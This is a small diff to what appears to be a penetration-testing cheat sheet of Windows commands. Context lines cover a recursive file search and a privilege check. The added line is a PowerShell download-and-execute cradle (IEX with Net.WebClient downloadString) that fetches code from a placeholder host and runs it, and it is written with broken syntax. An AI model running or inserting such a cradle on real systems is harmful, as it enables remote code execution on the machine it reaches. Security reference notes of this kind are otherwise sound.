@@ -552,6 +552,9 @@ Get-Childitem –Path C:\ -Recurse –force -ErrorAction SilentlyContinue -Inclu
 # display user privs
 whoami /all
 
+# download file onto box
+IEX/New-Object Net.WebClient().downloadString('http://IP_here/path/to/file')
+
 
 PYTHON
 ------
